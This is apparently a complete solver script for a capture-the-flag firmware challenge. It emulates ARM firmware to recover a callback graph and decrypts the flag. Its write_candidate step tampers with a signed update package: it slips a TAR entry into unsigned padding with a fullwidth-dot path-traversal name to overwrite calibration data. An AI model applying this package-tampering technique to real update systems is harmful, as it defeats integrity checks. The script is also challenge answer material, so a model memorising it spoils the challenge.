#!/usr/bin/env python3
from __future__ import annotations

from collections import Counter, defaultdict
from importlib.machinery import SourcelessFileLoader
from pathlib import Path
import hashlib
import io
import json
import os
import re
import shutil
import struct
import subprocess
import sys
import tarfile
import tempfile
import zlib

def locate_public_handout():
    candidates = [
        Path.cwd(),
        Path(__file__).resolve().parents[2],
        Path(__file__).resolve().parents[2].parent / "for_user",
    ]
    for candidate in candidates:
        resolved = candidate.resolve()
        if (resolved / "device.json").is_file() and (resolved / "crypto_core.py").is_file():
            return resolved
    raise RuntimeError("run from a ghost-callback handout containing device.json")


_CONFIGURED_HANDOUT = os.environ.get("GHOST_HANDOUT_DIR")
HANDOUT = (
    Path(_CONFIGURED_HANDOUT).resolve()
    if _CONFIGURED_HANDOUT
    else locate_public_handout()
)
PUBLIC_HANDOUT = None if _CONFIGURED_HANDOUT else HANDOUT
sys.path[:0] = [str(HANDOUT / "vendor"), str(HANDOUT)]
from capstone import Cs, CS_ARCH_ARM, CS_MODE_THUMB
from crypto_core import INSTALL_RECEIPT_MAGIC, aead_decrypt
from unicorn import Uc, UC_ARCH_ARM, UC_HOOK_CODE, UC_MODE_THUMB
from unicorn.arm_const import (
    UC_ARM_REG_LR,
    UC_ARM_REG_R6,
    UC_ARM_REG_SP,
)

AAD = b"ghost-callback-fleet-v6"
FLASH = 0x08000000
SRAM = 0x20000000
CONTEXT = SRAM + 0x2000
OUTPUT_OFFSET = 24
CALLBACK_COUNT = 96
CHAIN_LENGTH = 20
ROUTE_TARGET_OFFSETS = (0x1380, 0x1390, 0x13A0)
DEVICE_NAMES = ("a", "b", "c")
CALIBRATION_KDF_DOMAIN = b"ghost-callback-calibration-proof-v5\x00"
INTENDED_OVERWRITE_PATH = "extras/%EF%BC%8E%EF%BC%8E/profiles/calibration.bin"
EXPECTED_TRANSCRIPT = CHAIN_LENGTH * 8
ROUTE_STATE0_OFFSET = OUTPUT_OFFSET + EXPECTED_TRANSCRIPT
ROUTE_STATE1_OFFSET = ROUTE_STATE0_OFFSET + 4
PROBE_RETURN = FLASH + 0x700


def calibration(generation, mmio_seed, permutation_seed, nonce_material):
    body = b"CAL1" + struct.pack("<I", generation) + mmio_seed + permutation_seed + nonce_material
    return body + struct.pack("<II", zlib.crc32(body) & 0xFFFFFFFF, 0)


def calibration_seeds(recovered):
    material = bytearray(CALIBRATION_KDF_DOMAIN)
    for name in DEVICE_NAMES:
        proof = recovered[name]
        by_id = {edge[0]: edge for edge in proof["edges"]}
        material += name.encode("ascii")
        material += struct.pack("<II", *proof["route_target"])
        for callback_id in proof["chain"]:
            (
                _callback_id, expected, following, term0, term1,
                rotate0, rotate1, _address,
            ) = by_id[callback_id]
            material += struct.pack(
                "<BIIIIBB",
                callback_id, expected, following, term0, term1, rotate0, rotate1,
            )
    digest = hashlib.blake2s(material).digest()
    return digest[:16], digest[16:]


def immediate(op_str):
    match = re.search(r"#(0x[0-9a-f]+|[0-9]+)", op_str)
    if not match:
        raise ValueError("immediate recovery failed")
    return int(match.group(1), 0)


def immediate_pairs(instructions, register):
    values = []
    for first, second in zip(instructions, instructions[1:]):
        if (
            first.mnemonic == "movw" and second.mnemonic == "movt"
            and first.op_str.startswith(register + ",")
            and second.op_str.startswith(register + ",")
        ):
            values.append(immediate(first.op_str) | (immediate(second.op_str) << 16))
    return values


def masked_constants(instructions):
    """Recover constants materialized as (value^mask), mask, EOR."""
    values = []
    for index in range(len(instructions) - 4):
        first, second, third, fourth, fifth = instructions[index:index + 5]
        if not (
            first.mnemonic == "movw" and second.mnemonic == "movt"
            and third.mnemonic == "movw" and fourth.mnemonic == "movt"
            and fifth.mnemonic.startswith("eor")
        ):
            continue
        destination = first.op_str.split(",", 1)[0].strip()
        scratch = third.op_str.split(",", 1)[0].strip()
        if (
            not second.op_str.startswith(destination + ",")
            or not fourth.op_str.startswith(scratch + ",")
        ):
            continue
        operands = [part.strip() for part in fifth.op_str.split(",")]
        if operands != [destination, destination, scratch]:
            continue
        encoded = immediate(first.op_str) | (immediate(second.op_str) << 16)
        mask = immediate(third.op_str) | (immediate(fourth.op_str) << 16)
        values.append((index, destination, encoded ^ mask))
    return values


def pointer_table_candidates(firmware):
    candidates = []
    for offset in range(0x600, 0x1800, 4):
        addresses = struct.unpack_from(f"<{CALLBACK_COUNT}I", firmware, offset)
        if len(set(addresses)) != CALLBACK_COUNT:
            continue
        if all(
            FLASH + 0x1800 <= address < FLASH + len(firmware) - 2
            and firmware[address - FLASH:address - FLASH + 2] == b"\xf0\xb5"
            for address in addresses
        ):
            candidates.append((FLASH + offset, list(addresses)))
    return candidates


def recover_pointer_table(firmware):
    isr = struct.unpack_from("<I", firmware, 16 * 4)[0] & ~1
    disassembler = Cs(CS_ARCH_ARM, CS_MODE_THUMB)
    instructions = list(disassembler.disasm(firmware[isr - FLASH:isr - FLASH + 160], isr))
    referenced = {
        value
        for register in ("r0", "r1", "r2", "r3", "r4", "r5", "r6", "r7", "ip")
        for value in immediate_pairs(instructions, register)
    }
    matches = [addresses for address, addresses in pointer_table_candidates(firmware) if address in referenced]
    if len(matches) != 1:
        raise ValueError(f"ISR-selected callback pointer table is ambiguous: {len(matches)}")
    return matches[0]


def callback_instructions(firmware, address):
    disassembler = Cs(CS_ARCH_ARM, CS_MODE_THUMB)
    result = []
    for instruction in disassembler.disasm(firmware[address - FLASH:address - FLASH + 512], address):
        result.append(instruction)
        if instruction.mnemonic == "pop" and "pc" in instruction.op_str:
            break
    if not result or result[-1].mnemonic != "pop":
        raise ValueError(f"callback at {address:#x} has no return")
    return result


def callback_vm(firmware):
    emulator = Uc(UC_ARCH_ARM, UC_MODE_THUMB)
    emulator.mem_map(FLASH, 0x10000)
    emulator.mem_map(SRAM, 0x10000)
    emulator.mem_write(FLASH, firmware)
    emulator.reg_write(UC_ARM_REG_SP, SRAM + 0xF000)
    emulator.reg_write(UC_ARM_REG_LR, PROBE_RETURN | 1)
    return emulator


def recover_expected_guard(firmware, address):
    instructions = callback_instructions(firmware, address)
    comparisons = [instruction.address for instruction in instructions if instruction.mnemonic.startswith("cmp")]
    if not comparisons:
        raise ValueError("callback guard comparison not found")
    emulator = callback_vm(firmware)
    emulator.mem_write(CONTEXT, bytes(ROUTE_STATE1_OFFSET + 4))
    result = []

    def hook(uc, current, _size, _user):
        if current == comparisons[0]:
            result.append(uc.reg_read(UC_ARM_REG_R6) & 0xFFFFFFFF)
            uc.emu_stop()

    emulator.hook_add(UC_HOOK_CODE, hook)
    emulator.emu_start(address | 1, FLASH + len(firmware), count=1000)
    if len(result) != 1:
        raise ValueError("callback guard probe did not reach comparison")
    return result[0]


def execute_callback_probe(firmware, address, expected, route_state):
    emulator = callback_vm(firmware)
    context = bytearray(ROUTE_STATE1_OFFSET + 4)
    struct.pack_into("<I", context, 0, expected)
    struct.pack_into("<4I", context, 8, 0x13579BDF, 0x2468ACE0, 0x10203040, 0x55667788)
    struct.pack_into("<II", context, ROUTE_STATE0_OFFSET, *route_state)
    emulator.mem_write(CONTEXT, bytes(context))
    returned = []

    def hook(uc, current, _size, _user):
        if current == PROBE_RETURN:
            returned.append(True)
            uc.emu_stop()

    emulator.hook_add(UC_HOOK_CODE, hook)
    emulator.emu_start(address | 1, FLASH + len(firmware), count=3000)
    if not returned:
        raise ValueError(f"callback at {address:#x} did not return")
    raw = bytes(emulator.mem_read(CONTEXT, ROUTE_STATE1_OFFSET + 4))
    following = struct.unpack_from("<I", raw, 0)[0]
    state = struct.unpack_from("<II", raw, ROUTE_STATE0_OFFSET)
    return following, state


def recover_callback_semantics(firmware, address):
    expected = recover_expected_guard(firmware, address)
    inputs = ((0, 0), (0x01234567, 0x89ABCDEF), (0xF0E1D2C3, 0x10293847))
    probes = [execute_callback_probe(firmware, address, expected, state) for state in inputs]
    followings = {following for following, _state in probes}
    if len(followings) != 1:
        raise ValueError("callback next guard is input-dependent")

    first_candidates = []
    second_candidates = []
    for rotation in range(1, 32):
        terms = {
            old[0] ^ rotate_left((new[0] - old[1]) & 0xFFFFFFFF, rotation)
            for old, (_following, new) in zip(inputs, probes)
        }
        if len(terms) == 1:
            first_candidates.append((rotation, terms.pop()))
        terms = {
            old[1] ^ rotate_left((new[1] - new[0]) & 0xFFFFFFFF, rotation)
            for old, (_following, new) in zip(inputs, probes)
        }
        if len(terms) == 1:
            second_candidates.append((rotation, terms.pop()))
    if len(first_candidates) != 1 or len(second_candidates) != 1:
        raise ValueError("callback route transition is ambiguous")
    rotate0, term0 = first_candidates[0]
    rotate1, term1 = second_candidates[0]
    return expected, followings.pop(), term0, term1, rotate0, rotate1


def recover_callback_graph(firmware):
    addresses = recover_pointer_table(firmware)
    edges = []
    for callback_id, address in enumerate(addresses):
        expected, following, term0, term1, rotate0, rotate1 = recover_callback_semantics(
            firmware, address
        )
        edges.append((
            callback_id, expected, following, term0, term1,
            rotate0, rotate1, address,
        ))
    return edges


def recover_route_target(firmware, layers):
    matches = []
    for offset in ROUTE_TARGET_OFFSETS:
        target = struct.unpack_from("<II", firmware, offset)
        try:
            chain = solve_route(layers, target)
        except ValueError:
            continue
        matches.append((target, chain))
    if len(matches) != 1:
        raise ValueError(f"expected one reachable route target, found {len(matches)}")
    return matches[0]


def recover_layers(edges):
    outgoing = defaultdict(list)
    incoming = set()
    for callback_id, expected, following, term0, term1, rotate0, rotate1, _address in edges:
        outgoing[expected].append((callback_id, following, term0, term1, rotate0, rotate1))
        incoming.add(following)
    roots = [guard for guard, choices in outgoing.items() if len(choices) == 4 and guard not in incoming]
    valid = []
    for root in roots:
        guard = root
        layers = []
        for _ in range(CHAIN_LENGTH):
            choices = outgoing.get(guard, [])
            if len(choices) != 4 or len({choice[1] for choice in choices}) != 1:
                break
            layers.append(sorted(choices))
            guard = choices[0][1]
        if len(layers) == CHAIN_LENGTH:
            valid.append(layers)
    if len(valid) != 1:
        raise ValueError(f"expected one {CHAIN_LENGTH}-layer callback graph, found {len(valid)}")
    return valid[0]


def rotate_right(value, count):
    return ((value >> count) | (value << (32 - count))) & 0xFFFFFFFF


def rotate_left(value, count):
    return ((value << count) | (value >> (32 - count))) & 0xFFFFFFFF


def route_forward(state, choice):
    first, second = state
    first = (rotate_right(first ^ choice[2], choice[4]) + second) & 0xFFFFFFFF
    second = (rotate_right(second ^ choice[3], choice[5]) + first) & 0xFFFFFFFF
    return first, second


def route_inverse(state, choice):
    first, second = state
    old_second = rotate_left((second - first) & 0xFFFFFFFF, choice[5]) ^ choice[3]
    old_first = rotate_left((first - old_second) & 0xFFFFFFFF, choice[4]) ^ choice[2]
    return old_first, old_second


def pack_state(state):
    return (state[0] << 32) | state[1]


def solve_route(layers, target):
    """Bidirectional search over 4^20 coupled transitions (2 * 4^10 leaves)."""
    split = len(layers) // 2
    left = {}

    def build_left(depth, state, code):
        if depth == split:
            key = pack_state(state)
            left[key] = code if key not in left else -1
            return
        for choice_index, choice in enumerate(layers[depth]):
            build_left(depth + 1, route_forward(state, choice), (code << 2) | choice_index)

    build_left(0, (0, 0), 0)
    solutions = []
    reverse_path = []

    def search_right(depth, state):
        if len(solutions) > 1:
            return
        if depth < split:
            code = left.get(pack_state(state))
            if code is None:
                return
            if code < 0:
                solutions.extend((None, None))
                return
            prefix = [0] * split
            for index in range(split - 1, -1, -1):
                prefix[index] = code & 3
                code >>= 2
            solutions.append(prefix + list(reversed(reverse_path)))
            return
        for choice_index, choice in enumerate(layers[depth]):
            reverse_path.append(choice_index)
            search_right(depth - 1, route_inverse(state, choice))
            reverse_path.pop()

    search_right(len(layers) - 1, tuple(target))
    if len(solutions) != 1 or solutions[0] is None:
        raise ValueError(f"coupled route state has {len(solutions)} solutions")
    return [layers[index][choice_index][0] for index, choice_index in enumerate(solutions[0])]


def recover_nonce_and_targets(firmware):
    reset = struct.unpack_from("<I", firmware, 4)[0] & ~1
    disassembler = Cs(CS_ARCH_ARM, CS_MODE_THUMB)
    instructions = list(disassembler.disasm(firmware[reset - FLASH:reset - FLASH + 112], reset))
    r2_pairs = immediate_pairs(instructions, "r2")
    nonce_addresses = [value for value in r2_pairs if FLASH <= value <= FLASH + len(firmware) - 16]
    if not nonce_addresses:
        raise ValueError("nonce verification address not recovered")
    nonce_offset = nonce_addresses[0] - FLASH
    nonce = firmware[nonce_offset:nonce_offset + 16]
    referenced = {
        value
        for register in ("r0", "r1", "r2", "r3", "r4", "r5", "r6", "r7", "ip")
        for value in immediate_pairs(
            list(disassembler.disasm(firmware[reset - FLASH:reset - FLASH + 0x300], reset)),
            register,
        )
    }
    target_tables = []
    for address in referenced:
        offset = address - FLASH
        if offset < 0 or offset + CALLBACK_COUNT * 2 > len(firmware):
            continue
        values = list(struct.unpack_from(f"<{CALLBACK_COUNT}H", firmware, offset))
        if all(value <= 256 for value in values):
            target_tables.append(values)
    if len(target_tables) != 1:
        raise ValueError(f"runtime-selected target table is ambiguous: {len(target_tables)}")
    targets = target_tables[0]
    if len(nonce) != 16 or any(value > 256 for value in targets):
        raise ValueError("firmware calibration constants invalid")
    return nonce, targets


def permutation(seed):
    state = int.from_bytes(seed[:4], "little") or 1
    order = list(range(CALLBACK_COUNT))
    for index in range(CALLBACK_COUNT - 1, 0, -1):
        state ^= (state << 13) & 0xFFFFFFFF
        state ^= state >> 17
        state ^= (state << 5) & 0xFFFFFFFF
        state &= 0xFFFFFFFF
        other = (state & 255) % (index + 1)
        order[index], order[other] = order[other], order[index]
    return order


def condition(sample, channel, window, mmio_seed, targets):
    return ((sample ^ mmio_seed[channel & 15]) + window) % 257 == targets[channel]


def build_events(chain, mmio_seed, permutation_seed, targets):
    order = permutation(permutation_seed)
    # Leave the full Fisher-Yates boot shuffle behind before scheduling
    # input. Otherwise several already-due events can overwrite one MMIO slot.
    events, window, cycle = [], 0, 100_000
    for callback_id in chain:
        channel = order.index(callback_id)
        sequence = None
        for sample in range(256):
            next_window = (window + sample) & 255
            if condition(sample, channel, next_window, mmio_seed, targets):
                sequence = [(channel, sample)]
                break
        if sequence is None:
            for adjustment_channel in range(CALLBACK_COUNT):
                for adjustment in range(256):
                    adjusted_window = (window + adjustment) & 255
                    if condition(adjustment, adjustment_channel, adjusted_window, mmio_seed, targets):
                        continue
                    for sample in range(256):
                        next_window = (adjusted_window + sample) & 255
                        if condition(sample, channel, next_window, mmio_seed, targets):
                            sequence = [(adjustment_channel, adjustment), (channel, sample)]
                            break
                    if sequence:
                        break
                if sequence:
                    break
        if sequence is None:
            raise ValueError("MMIO event inversion failed")
        for event_channel, sample in sequence:
            cycle += 3000
            events.append({"cycle": cycle, "channel": event_channel, "sample": sample, "status": 1})
            window = (window + sample) & 255
    return events


def tar_header(name, size):
    """Create the optional TAR entry using the format visible in the handout."""
    raw_name = name.encode("ascii")
    if len(raw_name) > 100:
        raise ValueError("candidate TAR path is too long")
    header = bytearray(512)
    header[:len(raw_name)] = raw_name
    for position, width, value in (
        (100, 8, 0o600),
        (108, 8, 0),
        (116, 8, 0),
        (124, 12, size),
        (136, 12, 0),
    ):
        header[position:position + width] = f"{value:0{width - 1}o}\0".encode("ascii")
    header[148:156] = b"        "
    header[156] = ord("0")
    header[257:263] = b"ustar\0"
    header[263:265] = b"00"
    header[148:156] = f"{sum(header):06o}\0 ".encode("ascii")
    return bytes(header)


def original_entries(payload):
    """Parse the signed public TAR for regression checks and explanation."""
    result = []
    with tarfile.open(fileobj=io.BytesIO(payload), mode="r:") as archive:
        for member in archive.getmembers():
            if member.isfile():
                result.append((member.name, archive.extractfile(member).read()))
    return result


def write_candidate(calibration_data):
    package = bytearray((HANDOUT / "normal_update.pkg").read_bytes())
    header_size = struct.calcsize("<8sIIII")
    if len(package) < header_size:
        raise ValueError("public update package is truncated")
    magic, _version, manifest_size, signature_size, payload_size = struct.unpack_from(
        "<8sIIII", package
    )
    if magic != b"GHOSTPKG":
        raise ValueError("public update package magic mismatch")
    payload_offset = header_size + manifest_size + signature_size
    payload = bytearray(package[payload_offset:payload_offset + payload_size])
    if len(payload) != payload_size or len(payload) % 512:
        raise ValueError("public update TAR is malformed")
    empty = bytes(512)
    insertion = next(
        (
            offset
            for offset in range(0, len(payload), 512)
            if payload[offset:offset + 512] == empty
        ),
        None,
    )
    padded_size = (len(calibration_data) + 511) & ~511
    if insertion is None or insertion + 512 + padded_size + 512 > len(payload):
        raise ValueError("public update TAR has no optional-entry capacity")
    payload[insertion:insertion + 512] = tar_header(
        INTENDED_OVERWRITE_PATH, len(calibration_data)
    )
    payload[insertion + 512:insertion + 512 + len(calibration_data)] = calibration_data
    package[payload_offset:payload_offset + payload_size] = payload
    (HANDOUT / "candidate.pkg").write_bytes(package)
    return bytes(package)


def load_runner():
    tag = f"{sys.version_info.major}{sys.version_info.minor}"
    bytecode = HANDOUT / f"device_runner.cpython-{tag}.pyc"
    if not bytecode.is_file():
        raise RuntimeError(f"device runner is not built for CPython {sys.version_info.major}.{sys.version_info.minor}")
    return SourcelessFileLoader(
        "ghost_device_runner", str(bytecode)
    ).load_module()


def parse_outputs(raw):
    if raw[:4] != b"GCO5":
        raise ValueError("fleet output magic mismatch")
    cursor, result = 4, {}
    for name in DEVICE_NAMES:
        if cursor + 2 > len(raw):
            raise ValueError("fleet output truncated")
        length = struct.unpack_from("<H", raw, cursor)[0]
        cursor += 2
        if cursor + length > len(raw):
            raise ValueError("fleet output truncated")
        result[name] = raw[cursor:cursor + length]
        cursor += length
    if cursor != len(raw) or any(len(value) != EXPECTED_TRANSCRIPT for value in result.values()):
        raise ValueError("fleet output length mismatch")
    return result


def derive_key(calibration_data, firmwares, outputs, install_receipt=None):
    if install_receipt is None:
        install_receipt = (HANDOUT / ".stage/.install_receipt").read_bytes()
    if len(install_receipt) != 36 or not install_receipt.startswith(INSTALL_RECEIPT_MAGIC):
        raise ValueError("semantic install receipt mismatch")
    material = bytearray(b"ghost-callback-fleet-receipt-v6\x00")
    material += hashlib.sha256(calibration_data).digest()
    material += install_receipt[4:]
    for name in DEVICE_NAMES:
        material += (
            name.encode() + hashlib.sha256(firmwares[name]).digest() + outputs[name]
        )
    return hashlib.blake2s(material).digest()


def solve_workspace(progress=True):
    if PUBLIC_HANDOUT is not None and HANDOUT == PUBLIC_HANDOUT:
        raise RuntimeError("refusing to run the writable pipeline in the public handout")

    def report(number, text):
        if progress:
            print(f"[{number}/7] {text}", flush=True)

    report(1, "signed package boundary and Unicode normalization mismatch")
    firmwares = {name: (HANDOUT / f"firmware_{name}.bin").read_bytes() for name in DEVICE_NAMES}
    recovered = {}
    common_nonce = None
    for index, name in enumerate(DEVICE_NAMES, 2):
        report(index, f"device_{name}: masked constants, 4^20 graph, coupled route state")
        edges = recover_callback_graph(firmwares[name])
        layers = recover_layers(edges)
        route_target, chain = recover_route_target(firmwares[name], layers)
        nonce, targets = recover_nonce_and_targets(firmwares[name])
        if common_nonce is None:
            common_nonce = nonce
        elif common_nonce != nonce:
            raise ValueError("fleet nonce mismatch")
        recovered[name] = {
            "chain": chain,
            "targets": targets,
            "edges": edges,
            "route_target": route_target,
        }

    report(5, "universal candidate package with compatibility-character rebinding")
    mmio_seed, permutation_seed = calibration_seeds(recovered)
    cal = calibration(18, mmio_seed, permutation_seed, common_nonce)
    write_candidate(cal)
    update = subprocess.run([str(HANDOUT / "updater")], cwd=HANDOUT, capture_output=True, text=True)
    if update.returncode:
        raise ValueError(update.stderr.strip())

    report(6, "invert three MMIO schedules and collect 20-callback transcripts")
    runner = load_runner()
    chains, events_by_device = {}, {}
    for name in DEVICE_NAMES:
        chain = recovered[name]["chain"]
        targets = recovered[name]["targets"]
        events = build_events(chain, mmio_seed, permutation_seed, targets)
        output = runner.run_firmware(firmwares[name], cal, events)
        if len(output) != EXPECTED_TRANSCRIPT:
            raise ValueError(f"device_{name}: semantic route did not execute")
        chains[name] = chain
        events_by_device[name] = events
        (HANDOUT / f"events_{name}.json").write_text(json.dumps({"events": events}, indent=2) + "\n")
    actual = subprocess.run([str(HANDOUT / "device_runner")], cwd=HANDOUT, capture_output=True, text=True)
    if actual.returncode:
        raise ValueError(actual.stderr.strip())
    outputs = parse_outputs((HANDOUT / "callback_outputs.bin").read_bytes())

    report(7, "combine all device transcripts and authenticate the flag")
    blob = (HANDOUT / "flag.enc").read_bytes()
    if blob[:4] != b"GCF6":
        raise ValueError("flag container mismatch")
    key = derive_key(cal, firmwares, outputs)
    plaintext = aead_decrypt(key, blob[4:16], blob[16:], AAD).decode()
    if not plaintext.startswith("SHA{"):
        raise ValueError("decrypted value is not a flag")
    if progress:
        print(plaintext)
    return plaintext, chains, events_by_device


def solve(progress=True):
    """Run the destructive pipeline in a disposable handout copy."""
    global HANDOUT
    original = HANDOUT
    with tempfile.TemporaryDirectory() as directory:
        work = Path(directory) / "handout"
        shutil.copytree(
            original,
            work,
            ignore=shutil.ignore_patterns(
                "_solve", "solution", "__pycache__", ".stage",
                "candidate.pkg", "callback_outputs.bin",
            ),
        )
        HANDOUT = work
        try:
            return solve_workspace(progress)
        finally:
            HANDOUT = original


def solve_isolated():
    return solve()


if __name__ == "__main__":
    solve()
